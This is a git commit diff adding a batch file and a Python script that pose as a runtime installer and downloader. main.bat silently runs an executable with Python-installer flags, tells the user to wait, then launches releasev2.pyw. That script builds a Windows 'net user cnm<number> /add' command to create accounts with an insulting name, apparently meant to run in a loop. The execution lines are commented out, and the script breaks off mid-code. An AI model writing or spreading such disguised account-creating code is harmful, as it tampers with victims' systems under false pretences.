676f827db9bd47a7964f5d8b2c05cd5d862a6625
IcyBlue17 <96235160+IcyBlue17@users.noreply.github.com>
2022-05-31 18:56:16 +0800

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,39 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCuDJH6w1QIGAVtnWAGDMSboVOVJu7i238C78wOYmgu3u2pTBUQG4QyWMLaqcI4otg==
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+echo 开始安装运行库.....
+start Downloader-new.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=1 Include_lib=1 Include_pip=1
+echo 请您等待5分钟后！再按任意键打开下载程序
+pause
+py releasev2.pyw
---
+++ releasev2.pyw
@@ -0,0 +1,10 @@
+#lzkiller
+cs=0
+import os,random
+yh1=str("net user cnm")
+yh2=str(random.randint(5,200000))
+yh3=str(" /add")
+yh=yh1+yh2+yh3
+#os.system(yh)
+#while cs < 1000:
+ #   os.system
